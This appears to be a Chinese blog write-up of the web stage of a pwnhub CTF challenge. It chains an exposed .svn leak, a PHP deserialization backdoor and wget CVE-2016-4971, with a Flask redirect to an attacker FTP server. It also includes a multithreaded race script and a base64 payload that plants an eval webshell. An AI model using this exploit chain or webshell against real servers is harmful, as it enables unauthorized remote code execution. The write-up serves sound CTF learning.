---
title: pwnhub_another php web部分
date: 2017-03-05 21:22:23
tags:
- pwnhub
- php
- wget
categories:
- Blogs
---

周末不是太有时间，所以就没怎么打pwnhub，后来快结束的时候完成了web部分，这里贴上web部分的wp吧

<!--more-->

开始没啥可说的，应该是用来当一些咸鱼的吧，index.php~

![image_1bafa2nvpl7hl7n14d71sjk4g3m.png-15.1kB][1]

登陆框，验证码很普通的，没啥可说的，试了试没啥可玩的，那就扫目录，找到了.svn

```
http://52.80.32.116/2d9bc625acb1ba5d0db6f8d0c8b9d206/.svn/

400
```

跑脚本拖源码报错了，搜了搜好像是拖的数据库报错了，所以手动看看，好像是内容被改过了

```
http://52.80.32.116/2d9bc625acb1ba5d0db6f8d0c8b9d206/.svn/wc.db

Myname:Pwnhub{6666666flag}
havefun:)

用户名和密码相同

The a9b4d7cc810da015142f61f7e236d50b.php:)Welcome Pwnhub{6666666flag}
```

![image_1bad45g037c73iessr9qgp4u9.png-33.2kB][2]

源码是phpjm加密，没啥可说的，直接工具解

[http://tool.lu/php/](http://tool.lu/php/)

拿到源码

```
<?php
error_reporting(E_ALL);
$firesun_path = '';
class Pwnhub
{
    function __wakeup()
    {
        if (isset($_GET['pwnhub']) == "firesun") {
            echo "Hacked by Firesun!";
            eval(base64_decode($_POST['pwnhub']));
        }
    }
}
function pwnhubfile()
{
    global $firesun_path;
    file_put_contents($firesun_path . '/firesun', serialize($_SESSION));
}
session_start();
register_shutdown_function('pwnhubfile');
function set_context($id)
{
    global $_SESSION, $firesun_path;
    $firesun_path = '/var/www/data/' . $id;
    if (!is_dir($firesun_path)) {
        mkdir($firesun_path);
    }
    chdir($firesun_path);
    if (!is_file('firesun')) {
        $_SESSION = array();
    } else {
        $_SESSION = unserialize(file_get_contents('firesun'));
    }
}
function download_image($url)
{
    $url = parse_url($origUrl = $url);
    if (isset($url['scheme']) && $url['scheme'] == 'http') {
        if ($url['path'] == '/pwnhub.png') {
            if (isset($url['query'])) {
                die('byebyebye');
            }
            wget_wrapper($origUrl);
            echo "Nice:)";
        } else {
            echo 'sorry!';
        }
    }
}
if (!isset($_SESSION['id'])) {
    $sessId = bin2hex(openssl_random_pseudo_bytes(10));
    $_SESSION['id'] = $sessId;
} else {
    $sessId = $_SESSION['id'];
}
session_write_close();
set_context($sessId);

if (isset($_POST['image'])) {
    $p = $_POST['image'];
    if (stripos($p, 'php')) {
        echo 'wow!!!';
        die('byebye');
    }
    download_image($p);
    echo '<img src="pwnhub.jpg" width=184 height=200/>';
} else {
    die('no image:(');
}
?>
<!-- pwnhubs0urcec0d3.zip -->
<?php 
```

关键问题在于怎么控制firesun文件内容....

我们看看提示

```
2017.03.04 21:20:00wget_wrapper就是wget，不要想着在url上做文章进行命令执行，过滤很严，wget版本较低，wget版本较低，wget版本较低，重要的话说三遍
```

根据提示和源码，我们发现是SECUINSIDE CTF Quals 2016 - Trendyweb改的，然后找到wget漏洞CVE-2016-4971，发现一篇wp

[http://quanyang.github.io/secuinside-ctf-quals-2016-trendyweb/](http://quanyang.github.io/secuinside-ctf-quals-2016-trendyweb/)

根据wp自己研究发现简单的方式被和谐了，所以只能竞争解决问题。

这里稍微梳理下竞争逻辑：

1、访问的时候会生成独有的sessionid，并执行`set_context($sessId);`，获取firesun文件内容。

2、在第一次请求结束后，pwnhubfile会执行生成firesun

```
function pwnhubfile()
{
    global $firesun_path;
    file_put_contents($firesun_path . '/firesun', serialize($_SESSION));
}

register_shutdown_function('pwnhubfile');
```

但最重要的问题wget是不能覆盖文件的，如果wget相同文件名的，会出现firesun.1。

也就是说第一次请求结束还没能反序列化成功，就代表这里失败了。

所以我们每个sessionid只能使用一次，这里需要一个成熟的多线程脚本。




先配个线上环境，开一个flask加个跳转至ftp
```
#!/usr/bin/env python
from flask import Flask, redirect

app = Flask(__name__)

@app.route("/pwnhub.png")
def test():
    return redirect("ftp://119.29.192.14/firesun")

if __name__ == "__main__":
    app.run(host="0.0.0.0",port=8082)

```

然后另一个地方开个ftp，端口设为默认21

```
sudo python -m pyftpdlib -p 21
```

目录下写个firesun
```
O:6:"Pwnhub":0:{}
```

多线程脚本
```
import requests
import threading
import time
from random import Random

url = "http://52.80.32.116/2d9bc625acb1ba5d0db6f8d0c8b9d206/a9b4d7cc810da015142f61f7e236d50b.php"

def down(cookie):

    data = {'image': 'http://119.29.192.14:8082/pwnhub.png'}

    r = requests.post(url, data = data, cookies=cookie)


def ri(cookie):
    s = requests.Session()

    data = {'pwnhub': 'ZmlsZV9wdXRfY29udGVudHMoIi92YXIvd3d3L2h0bWwvMmQ5YmM2MjVhY2IxYmE1ZDBkYjZmOGQwYzhiOWQyMDYvaW1hZ2UvZGRvZ2UucGhwIiwgYmFzZTY0X2RlY29kZSgiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTWwwcE96OCsiKSk7'}

    r = s.post(url + "?pwnhub=firesun", data = data, cookies=cookie)
    if "Hacked by Firesun" in r.text:
        print r.text


def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 19
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str

for i in range(0,10000):

    session = random_str(26)

    cookie = {'PHPSESSID': session}

    threading.Thread(target = down,args = (cookie,)).start()
    threading.Thread(target = ri,args = (cookie,)).start()

```

能成功，但是几率不高，我们把shell写入到image/下

踩了个蜜汁坑，base64_decode过后会把`<?php ?>`中间的东西省略掉...所以又加了一层。

```
<?php eval($_POST[2]);?


file_put_contents("/var/www/html/2d9bc625acb1ba5d0db6f8d0c8b9d206/image/ddoge.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbMl0pOz8+"));


ZmlsZV9wdXRfY29udGVudHMoIi92YXIvd3d3L2h0bWwvMmQ5YmM2MjVhY2IxYmE1ZDBkYjZmOGQwYzhiOWQyMDYvaW1hZ2UvZGRvZ2UucGhwIiwgYmFzZTY0X2RlY29kZSgiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTWwwcE96OCsiKSk7
```

很多函数都过滤了，所以只有eval的webshell
```
exec,passthru,shell_exec,assert,glob,imageftbbox,bindtextdom,dir,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,symlink,chgrp,chmod,chown,dl,mail,readlink,stream_socket_server,fsocket,imap_mail,apache_child_terminate,posix_kill,proc_terminate,proc_get_status,syslog,openlog,ini_alter,chroot,fread,fgets,fgetss,file,readfile,ini_set,ini_restore,putenv,apache_setenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,fpassthru,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,fputs,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,highlight_file,show_source,copy,system,	
```

![image_1baf7qq8413qm1l5j8ff1dnn9u39.png-84.9kB][3]


听ven师傅说后面是pwn php，我就不自寻死路了，就到这里


  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/3ahdwdvid617k41przx54lx5/image_1bafa2nvpl7hl7n14d71sjk4g3m.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/w71w0hbgw4cnrhafki8fft94/image_1bad45g037c73iessr9qgp4u9.png
  [3]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/kiqpvpnu7yxvoyh58t42bwjh/image_1baf7qq8413qm1l5j8ff1dnn9u39.png